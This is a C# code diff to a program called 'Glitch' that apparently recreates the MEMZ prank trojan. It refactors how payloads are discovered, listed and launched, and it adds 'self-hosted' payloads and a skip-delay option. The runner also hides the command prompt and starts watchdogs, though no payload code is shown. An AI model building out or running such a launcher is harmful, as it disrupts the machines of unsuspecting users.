@@ -11,6 +11,7 @@ namespace Glitch
     public class Program
     {
         public static List<Tuple<MethodInfo, PayloadAttribute>>? payloads;
+        public static List<Tuple<MethodInfo, PayloadAttribute>>? selfHostedPayloads;
 
         public static void Main(string[] args)
         {
@@ -22,14 +23,16 @@ namespace Glitch
             args = args == null || args.Length == 0
                 ? new[] {"form"}
                 : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
-            payloads = Assembly.GetAssembly(typeof(PayloadClassAttribute)).GetTypes()
+            payloads = Assembly.GetAssembly(typeof(Memz)).GetTypes()
                 .Where(s => s.IsClass &&
                             s.GetCustomAttributes(false).Any(a => a is PayloadClassAttribute))
                 .SelectMany(s => s.GetMethods()).Where(s =>
                     !s.GetParameters().Any(q => true) && s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
-                .OrderBy(s => s.GetPayloadName())
                 .Select(s => new Tuple<MethodInfo, PayloadAttribute>(s,
-                    (PayloadAttribute) s.GetCustomAttributes(false).First(a => a is PayloadAttribute))).ToList();
+                    (PayloadAttribute) s.GetCustomAttributes(false).First(a => a is PayloadAttribute)))
+                .OrderBy(s => s.Item2.Name).ToList();
+            selfHostedPayloads = payloads.Where(s => s.Item2.SelfHosted).ToList();
+            payloads = payloads.Where(s => !s.Item2.SelfHosted).ToList();
             switch (args[0])
             {
                 case "form":
@@ -38,15 +41,22 @@ namespace Glitch
                     Application.Run(new RunGUI());
                     break;
                 case "list":
-                    Console.WriteLine(
-                        string.Join(Environment.NewLine, payloads.Select(s => s.Item1.GetPayloadName())));
+                    Console.WriteLine("- " +
+                                      string.Join($"{Environment.NewLine}- ",
+                                          payloads.Select(s => $"{s.Item2.Name} ({s.Item1.Name.Remove(0, 7)})")));
+                    Console.WriteLine("");
+                    Console.WriteLine("Self-Hosted:");
+                    Console.WriteLine("- " +
+                                      string.Join($"{Environment.NewLine}- ",
+                                          selfHostedPayloads.Select(s => $"{s.Item2.Name} ({s.Item1.Name.Remove(0, 7)})")));
+                    Console.WriteLine("");
                     Console.WriteLine(
                         "[run] also accepts \"wd\", indicating watchdogs should be used, \"np\" for showing the notepad prompt," +
                         Environment.NewLine + "\"hd\" for hiding the command prompt and \"sd\" to skip delays");
                     break;
                 case "full":
                     StandardCommands.ShowNotepad();
-                    payloads.ForEach(s => LaunchRunner(s.Item1, s.Item2));
+                    payloads.ForEach(s => LaunchRunner(s.Item1, s.Item2, false));
                     StandardCommands.LaunchIncrementor();
                     StandardCommands.HideCmd();
                     StandardCommands.RunWDs();
@@ -55,14 +65,21 @@ namespace Glitch
                     if (args.Contains("np"))
                         StandardCommands.ShowNotepad();
                     Console.WriteLine("Using payloads:");
-                    payloads.Where(s => args.Skip(1).Any(a => s.Item1.GetPayloadName().ToLower() == a)).ToList()
+                    payloads.Where(s => args.Skip(1).Any(a => s.Item2.Name.ToLower() == a)).ToList()
                         .ForEach(
                             s =>
                             {
-                                Console.WriteLine($"- {s.Item1.GetPayloadName()}");
-                                LaunchRunner(s.Item1, s.Item2);
-                                StandardCommands.GetRunner(s.Item1, args.Contains("sd") ? 0 : s.Item2.RunAfter,
-                                    s.Item2.DefaultDelay);
+                                Console.WriteLine($"- {s.Item2.Name}");
+                                LaunchRunner(s.Item1, s.Item2, args.Contains("sd"));
+                            });
+                    selfHostedPayloads.Where(s => args.Skip(1).Any(a => s.Item2.Name.ToLower() == a))
+                        .ToList()
+                        .ForEach(
+                            s =>
+                            {
+                                Console.WriteLine($"- {s.Item2.Name}");
+                                StandardCommands.GetSelfHostedRunner(s.Item1,
+                                    args.Contains("sd") ? 0 : s.Item2.RunAfter);
                             });
                     StandardCommands.LaunchIncrementor();
                     if (args.Contains("hd"))
@@ -116,7 +133,7 @@ namespace Glitch
 #endif
         }
 
-        public static void LaunchRunner(MethodInfo method, PayloadAttribute data) =>
-            StandardCommands.GetRunner(method, data.RunAfter, data.DefaultDelay).Start();
+        public static void LaunchRunner(MethodInfo method, PayloadAttribute data, bool sd) =>
+            StandardCommands.GetRunner(method, sd ? 0 : data.RunAfter, data.DefaultDelay).Start();
     }
 }
